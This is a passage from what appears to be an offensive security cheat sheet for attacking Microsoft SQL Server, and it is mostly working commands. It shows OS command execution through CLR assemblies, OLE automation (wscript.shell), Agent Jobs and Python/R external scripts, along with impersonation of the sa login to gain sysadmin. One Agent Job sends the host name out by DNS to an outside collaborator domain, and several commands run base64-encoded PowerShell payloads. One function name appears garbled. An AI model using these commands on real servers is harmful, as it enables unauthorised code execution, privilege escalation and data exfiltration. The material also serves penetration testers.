</span></span><span style="display:flex;"><span>        SqlDataRecord <span style="color:#66d9ef">record</span> = <span style="color:#66d9ef">new</span> SqlDataRecord(<span style="color:#66d9ef">new</span> SqlMetaData(<span style="color:#e6db74">&#34;output&#34;</span>, SqlDbType.NVarChar, <span style="color:#ae81ff">4000</span>));
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Mark the beginning of the result set.</span>
</span></span><span style="display:flex;"><span>        SqlContext.Pipe.SendResultsStart(record);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Set values for each column in the row</span>
</span></span><span style="display:flex;"><span>        record.SetString(<span style="color:#ae81ff">0</span>, proc.StandardOutput.ReadToEnd().ToString());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Send the row back to the client.</span>
</span></span><span style="display:flex;"><span>        SqlContext.Pipe.SendResultsRow(record);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Mark the end of the result set.</span>
</span></span><span style="display:flex;"><span>        SqlContext.Pipe.SendResultsEnd();
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        proc.WaitForExit();
</span></span><span style="display:flex;"><span>        proc.Close();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>Then follow these instructions:</p>
<ol>
<li>Enable <code>show advanced options</code> on the server
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>,<span style="color:#ae81ff">1</span>; 
</span></span><span style="display:flex;"><span>RECONFIGURE
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GO</span>
</span></span></code></pre></div></li>
<li>Enable CLR on the server
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sp_configure <span style="color:#e6db74">&#39;clr enabled&#39;</span>,<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>RECONFIGURE
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GO</span>
</span></span></code></pre></div></li>
<li>Import the assembly
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> ASSEMBLY my_assembly
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> <span style="color:#e6db74">&#39;c:\temp\cmd_exec.dll&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WITH</span> PERMISSION_SET <span style="color:#f92672">=</span> UNSAFE;
</span></span></code></pre></div></li>
<li>Link the assembly to a stored procedure
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">PROCEDURE</span> [dbo].[cmd_exec] <span style="color:#f92672">@</span>execCommand NVARCHAR (<span style="color:#ae81ff">4000</span>) <span style="color:#66d9ef">AS</span> <span style="color:#66d9ef">EXTERNAL</span> NAME [my_assembly].[StoredProcedures].[cmd_exec];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GO</span>
</span></span></code></pre></div></li>
<li>Execute and clean
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>cmd_exec <span style="color:#e6db74">&#34;whoami&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">PROCEDURE</span> cmd_exec
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">DROP</span> ASSEMBLY my_assembly
</span></span></code></pre></div></li>
</ol>
<p><strong>CREATE ASSEMBLY</strong> will also accept an hexadecimal string representation of a CLR DLL</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> ASSEMBLY [my_assembly] <span style="color:#66d9ef">AUTHORIZATION</span> [dbo] <span style="color:#66d9ef">FROM</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>x4D5A90000300000004000000F[TRUNCATED]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WITH</span> PERMISSION_SET <span style="color:#f92672">=</span> UNSAFE 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">GO</span> 
</span></span></code></pre></div><h2 id="ole-automation">
  OLE Automation
  <a class="anchor" href="#ole-automation">#</a>
</h2>
<ul>
<li>:warning: Disabled by default</li>
<li>The execution takes place with privileges of the <strong>service account</strong>.</li>
</ul>
<h3 id="execute-commands-using-ole-automation-procedures">
  Execute commands using OLE automation procedures
  <a class="anchor" href="#execute-commands-using-ole-automation-procedures">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;whoami&#34;</span> Verbose
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Enable OLE Automation</span>
</span></span><span style="display:flex;"><span>EXEC sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>EXEC sp_configure reconfigure
</span></span><span style="display:flex;"><span>EXEC sp_configure <span style="color:#e6db74">&#39;OLE Automation Procedures&#39;</span>, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>EXEC sp_configure reconfigure
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute commands</span>
</span></span><span style="display:flex;"><span>DECLARE @execmd INT
</span></span><span style="display:flex;"><span>EXEC SP_OACREATE <span style="color:#e6db74">&#39;wscript.shell&#39;</span>, @execmd OUTPUT
</span></span><span style="display:flex;"><span>EXEC SP_OAMETHOD @execmd, <span style="color:#e6db74">&#39;run&#39;</span>, null, <span style="color:#e6db74">&#39;%systemroot%\system32\cmd.exe /c&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py</span>
</span></span><span style="display:flex;"><span>python3 mssqlclient.py <span style="color:#e6db74">&#39;host/username:password@10.10.10.10&#39;</span> -install -clr Microsoft.SqlServer.Proxy.dll
</span></span><span style="display:flex;"><span>python3 mssqlclient.py <span style="color:#e6db74">&#39;host/username:password@10.10.10.10&#39;</span> -check -reciclador <span style="color:#e6db74">&#39;C:\windows\temp\reciclador.dll&#39;</span>
</span></span><span style="display:flex;"><span>python3 mssqlclient.py <span style="color:#e6db74">&#39;host/username:password@10.10.10.10&#39;</span> -start -reciclador <span style="color:#e6db74">&#39;C:\windows\temp\reciclador.dll&#39;</span>
</span></span><span style="display:flex;"><span>SQL&gt; enable_ole
</span></span><span style="display:flex;"><span>SQL&gt; upload reciclador.dll C:\windows\temp\reciclador.dll
</span></span></code></pre></div><h2 id="agent-jobs">
  Agent Jobs
  <a class="anchor" href="#agent-jobs">#</a>
</h2>
<ul>
<li>The execution takes place with privileges of the <strong>SQL Server Agent service account</strong> if a proxy account is not configured.</li>
<li>:warning: Require <strong>sysadmin</strong> or <strong>SQLAgentUserRole</strong>, <strong>SQLAgentReaderRole</strong>, and <strong>SQLAgentOperatorRole</strong> roles to create a job.</li>
</ul>
<h3 id="execute-commands-through-sql-agent-job-service">
  Execute commands through SQL Agent Job service
  <a class="anchor" href="#execute-commands-through-sql-agent-job-service">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;powershell e &lt;base64encodedscript&gt;&#34;</span> -Verbose
</span></span><span style="display:flex;"><span>Subsystem Options<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">–</span>Subsystem CmdExec
</span></span><span style="display:flex;"><span>-SubSystem PowerShell
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">–</span>Subsystem VBScript
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">–</span>Subsystem Jscript
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>USE msdb; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> dbo.sp_add_job <span style="color:#f92672">@</span>job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_add_jobstep <span style="color:#f92672">@</span>job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>, <span style="color:#f92672">@</span>step_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_name1&#39;</span>, <span style="color:#f92672">@</span>subsystem <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;PowerShell&#39;</span>, <span style="color:#f92672">@</span>command <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;$name=$env:COMPUTERNAME[10];nslookup &#34;$name.redacted.burpcollaborator.net&#34;&#39;</span>, <span style="color:#f92672">@</span>retry_attempts <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">@</span>retry_interval <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span> ;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> dbo.sp_add_jobserver <span style="color:#f92672">@</span>job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> dbo.sp_start_job N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- delete
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">EXEC</span> dbo.sp_delete_job <span style="color:#f92672">@</span>job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>;
</span></span></code></pre></div><h3 id="list-all-jobs">
  List All Jobs
  <a class="anchor" href="#list-all-jobs">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>SELECT job_id, [<span style="color:#66d9ef">name</span>] FROM msdb.dbo.sysjobs;
</span></span><span style="display:flex;"><span>SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id
</span></span><span style="display:flex;"><span>Get-SQLAgentJob -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -username sa -Password Password1234 -Verbose
</span></span></code></pre></div><h2 id="external-scripts">
  External Scripts
  <a class="anchor" href="#external-scripts">#</a>
</h2>
<p>:warning: You need to enable <strong>external scripts</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sp_configure <span style="color:#e6db74">&#39;external scripts enabled&#39;</span>, <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>RECONFIGURE;
</span></span></code></pre></div><h2 id="python">
  Python:
  <a class="anchor" href="#python">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;powershell -e &lt;base64encodedscript&gt;&#34;</span> -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXEC sp_execute_external_script @language =N<span style="color:#e6db74">&#39;Python&#39;</span>,@script=N<span style="color:#e6db74">&#39;import subprocess p = subprocess.Popen(&#34;cmd.exe /c whoami&#34;, stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &#34;utf-8&#34;)])&#39;</span>
</span></span><span style="display:flex;"><span>WITH RESULT SETS (([<span style="color:#66d9ef">cmd_out</span>] nvarchar(max)))
</span></span></code></pre></div><h2 id="r">
  R
  <a class="anchor" href="#r">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;powershell -e &lt;base64encodedscript&gt;&#34;</span> -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXEC sp_execute_external_script @language=N<span style="color:#e6db74">&#39;R&#39;</span>,@script=N<span style="color:#e6db74">&#39;OutputDataSet &lt;- data.frame(system(&#34;cmd.exe /c dir&#34;,intern=T))&#39;</span>
</span></span><span style="display:flex;"><span>WITH RESULT SETS (([<span style="color:#66d9ef">cmd_out</span>] text));
</span></span><span style="display:flex;"><span>GO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>@script=N<span style="color:#e6db74">&#39;OutputDataSet &lt;-data.frame(shell(&#34;dir&#34;,intern=T))&#39;</span>
</span></span></code></pre></div><h2 id="audit-checks">
  Audit Checks
  <a class="anchor" href="#audit-checks">#</a>
</h2>
<h3 id="find-and-exploit-impersonation-opportunities">
  Find and exploit impersonation opportunities
  <a class="anchor" href="#find-and-exploit-impersonation-opportunities">#</a>
</h3>
<ul>
<li>Impersonate as: <code>EXECUTE AS LOGIN = 'sa'</code></li>
<li>Impersonate <code>dbo</code> with DB_OWNER
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> is_member(<span style="color:#e6db74">&#39;db_owner&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">execute</span> <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">user</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dbo&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> is_srvrolemember(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
</span></span></code></pre></div></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Exploit -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># impersonate sa account</span>
</span></span><span style="display:flex;"><span>powerpick Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;EXECUTE AS LOGIN = &#39;sa&#39;; SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&#34;</span> -Verbose -Debug
</span></span></code></pre></div><h2 id="find-databases-that-have-been-configured-as-trustworthy">
  Find databases that have been configured as trustworthy
  <a class="anchor" href="#find-databases-that-have-been-configured-as-trustworthy">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>SQLAuditPrivTrustworthy <span style="color:#f92672">-</span>Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> <span style="color:#f92672">-</span>Exploit <span style="color:#f92672">-</span><span style="color:#66d9ef">Verbose</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name <span style="color:#66d9ef">as</span> database_name, SUSER_NAME(owner_sid) <span style="color:#66d9ef">AS</span> database_owner, is_trustworthy_on <span style="color:#66d9ef">AS</span> TRUSTWORTHY <span style="color:#66d9ef">from</span> sys.databases
</span></span></code></pre></div><blockquote>
<p>The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLAuditPrivXpDirtree
</span></span><span style="display:flex;"><span>Invoke-SQLUncPathInjection
</span></span><span style="display:flex;"><span>Invoke-SQLAuditPrivXpFileexist
</span></span></code></pre></div><h2 id="manual-sql-server-queries">
  Manual SQL Server Queries
  <a class="anchor" href="#manual-sql-server-queries">#</a>
</h2>
<h3 id="query-current-user--determine-if-the-user-is-a-sysadmin">
  Query Current User &amp; determine if the user is a sysadmin
  <a class="anchor" href="#query-current-user--determine-if-the-user-is-a-sysadmin">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> suser_sname()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> <span style="color:#66d9ef">system_user</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> is_srvrolemember(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
</span></span></code></pre></div><h3 id="current-role">
  Current Role
  <a class="anchor" href="#current-role">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> <span style="color:#66d9ef">user</span>
</span></span></code></pre></div><h3 id="current-db">
  Current DB
  <a class="anchor" href="#current-db">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> db_name()
</span></span></code></pre></div><h3 id="list-all-tables">
  List all tables
  <a class="anchor" href="#list-all-tables">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">from</span> information_schema.tables
</span></span></code></pre></div><h3 id="list-all-databases">
  List all databases
  <a class="anchor" href="#list-all-databases">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> name <span style="color:#66d9ef">from</span> master..sysdatabases
</span></span></code></pre></div><h3 id="all-logins-on-server">
  All Logins on Server
  <a class="anchor" href="#all-logins-on-server">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> sys.server_principals <span style="color:#66d9ef">where</span> type_desc <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;SERVER_ROLE&#39;</span>
</span></span></code></pre></div><h3 id="all-database-users-for-a-database">
  All Database Users for a Database
  <a class="anchor" href="#all-database-users-for-a-database">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> sys.database_principals <span style="color:#66d9ef">where</span> type_desc <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;database_role&#39;</span>;
</span></span></code></pre></div><h3 id="list-all-sysadmins">
  List All Sysadmins
  <a class="anchor" href="#list-all-sysadmins">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name,type_desc,is_disabled <span style="color:#66d9ef">FROM</span> sys.server_principals <span style="color:#66d9ef">WHERE</span> IS_SRVROLEMEMBER (<span style="color:#e6db74">&#39;sysadmin&#39;</span>,name) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><h3 id="list-all-database-roles">
  List All Database Roles
  <a class="anchor" href="#list-all-database-roles">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> DB1.name <span style="color:#66d9ef">AS</span> DatabaseRoleName,
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">isnull</span> (DB2.name, <span style="color:#e6db74">&#39;No members&#39;</span>) <span style="color:#66d9ef">AS</span> DatabaseUserName
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> sys.database_role_members <span style="color:#66d9ef">AS</span> DRM
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">RIGHT</span> <span style="color:#66d9ef">OUTER</span> <span style="color:#66d9ef">JOIN</span> sys.database_principals <span style="color:#66d9ef">AS</span> DB1
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ON</span> DRM.role_principal_id <span style="color:#f92672">=</span> DB1.principal_id
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">LEFT</span> <span style="color:#66d9ef">OUTER</span> <span style="color:#66d9ef">JOIN</span> sys.database_principals <span style="color:#66d9ef">AS</span> DB2
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ON</span> DRM.member_principal_id <span style="color:#f92672">=</span> DB2.principal_id
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> DB1.<span style="color:#66d9ef">type</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;R&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> DB1.name;
</span></span></code></pre></div><h3 id="effective-permissions-from-the-server">
  Effective Permissions from the Server
  <a class="anchor" href="#effective-permissions-from-the-server">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> fn_my_permissions(<span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#39;server&#39;</span>);
</span></span></code></pre></div><h3 id="effective-permissions-from-the-database">
  Effective Permissions from the Database
  <a class="anchor" href="#effective-permissions-from-the-database">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> fn_dp1my_permissions(<span style="color:#66d9ef">NULL</span>, <span style="color:#e6db74">&#39;DATABASE&#39;</span>);
</span></span></code></pre></div><h3 id="find-sql-server-logins-which-can-be-impersonated-for-the-current-database">
  Find SQL Server Logins Which can be Impersonated for the Current Database
  <a class="anchor" href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">distinct</span> b.name
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">from</span> sys.server_permissions a
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">inner</span> <span style="color:#66d9ef">join</span> sys.server_principals b
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">on</span> a.grantor_principal_id <span style="color:#f92672">=</span> b.principal_id
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">where</span> a.permission_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;impersonate&#39;</span>
</span></span></code></pre></div><h3 id="exploiting-impersonation">
  Exploiting Impersonation
  <a class="anchor" href="#exploiting-impersonation">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;adminuser&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> ORIGINAL_LOGIN()
</span></span></code></pre></div><h3 id="exploiting-nested-impersonation">
  Exploiting Nested Impersonation
  <a class="anchor" href="#exploiting-nested-impersonation">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stduser&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sa&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> ORIGINAL_LOGIN()
